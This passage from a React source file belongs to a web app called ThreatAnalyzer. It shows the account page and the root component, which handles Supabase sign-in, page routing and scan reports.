                      <p className="text-slate-200 text-sm leading-relaxed">{step.action}</p>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>
        )}

      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ACCOUNT
// ══════════════════════════════════════════════════════════════
function Account({ user, onBack, onSignOut }) {
  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-md mx-auto px-6 py-8">
        <div className="flex items-center gap-2 mb-8">
          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
          <span className="text-slate-700">/</span>
          <span className="text-sm text-slate-400">Account</span>
        </div>
        <Card className="p-6 mb-4">
          <div className="flex items-center gap-4 mb-5 pb-5 border-b border-white/[0.06]">
            <div className="w-10 h-10 rounded-full bg-blue-600/20 border border-blue-600/30 flex items-center justify-center text-blue-400 font-bold">
              {user?.email?.[0]?.toUpperCase()}
            </div>
            <div>
              <p className="font-semibold text-sm text-white">{user?.email}</p>
              <p className="text-xs text-slate-500">Free account</p>
            </div>
          </div>
          <div className="space-y-3">
            {[['Email',user?.email],['Member since',new Date(user?.created_at).toLocaleDateString('en-IN',{dateStyle:'long'})],['Plan','Free — unlimited scans']].map(([l,v])=>(
              <div key={l} className="flex justify-between">
                <span className="text-xs text-slate-500">{l}</span>
                <span className="text-xs text-slate-300 font-medium">{v}</span>
              </div>
            ))}
          </div>
        </Card>
        <button onClick={onSignOut} className="w-full py-2.5 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.06] text-slate-400 hover:text-white text-sm font-medium rounded-xl transition-colors">
          Sign Out
        </button>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ROOT
// ══════════════════════════════════════════════════════════════
export default function App() {
  const [page, setPage]     = useState('landing');
  const [user, setUser]     = useState(null);
  const [result, setResult] = useState(null);
  const [toast, setToast]   = useState(null);
  const [ready, setReady]   = useState(false);

  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) { setUser(data.session.user); setPage('dashboard'); }
      setReady(true);
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      setUser(session?.user || null);
      if (!session) setPage('landing');
    });
    return () => sub.subscription.unsubscribe();
  }, []);

  async function signOut() {
    await supabase.auth.signOut();
    setUser(null); setPage('landing');
  }

  if (!ready) return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center">
      <div className="w-6 h-6 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin" />
    </div>
  );

  const navProps = { user, onNewScan:()=>setPage('scan'), onAccount:()=>setPage('account'), onHome:()=>setPage(user?'dashboard':'landing'), onSignOut:signOut };

  return (
    <div className="min-h-screen bg-[#080a0e] text-white">
      <style>{`@keyframes fadeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}`}</style>

      {toast && <Toast {...toast} onClose={()=>setToast(null)} />}

      {user && page!=='landing' && (
        <header className="border-b border-white/[0.06] bg-[#080a0e]/90 backdrop-blur sticky top-0 z-40">
          <div className="max-w-5xl mx-auto px-6 h-14 flex items-center justify-between">
            <button onClick={navProps.onHome} className="flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center text-sm">🛡</div>
              <span className="font-bold text-white tracking-tight">ThreatAnalyzer</span>
              <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
            </button>
            <div className="flex items-center gap-1">
              <button onClick={()=>setPage('scan')} className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">
                + New Scan
              </button>
              <button onClick={()=>setPage('account')} className="px-3 py-1.5 text-slate-400 hover:text-white text-sm transition-colors rounded-lg hover:bg-white/5">
                Account
              </button>
            </div>
          </div>
        </header>
      )}

      {page==='landing' && <Landing onLogin={()=>setPage('login')} onSignup={()=>setPage('signup')} />}
      {(page==='login'||page==='signup') && <Auth mode={page} onSuccess={u=>{setUser(u);setPage('dashboard');}} onSwitch={()=>setPage(page==='login'?'signup':'login')} />}
      {page==='dashboard'&&user && <Dashboard user={user} onNewScan={()=>setPage('scan')} onViewScan={async id=>{try{const d=await apiFetch(`/api/scans/${id}`);setResult(d.scan.result);setPage('report');}catch(e){setToast({message:e.message,type:'error'});}}} />}
      {page==='scan'&&user && <NewScan onComplete={r=>{setResult(r);setPage('report');}} onBack={()=>setPage('dashboard')} />}
      {page==='report'&&result && <Report result={result} onBack={()=>setPage('dashboard')} onNewScan={()=>setPage('scan')} />}
      {page==='account'&&user && <Account user={user} onBack={()=>setPage('dashboard')} onSignOut={signOut} />}
    </div>
  );
}
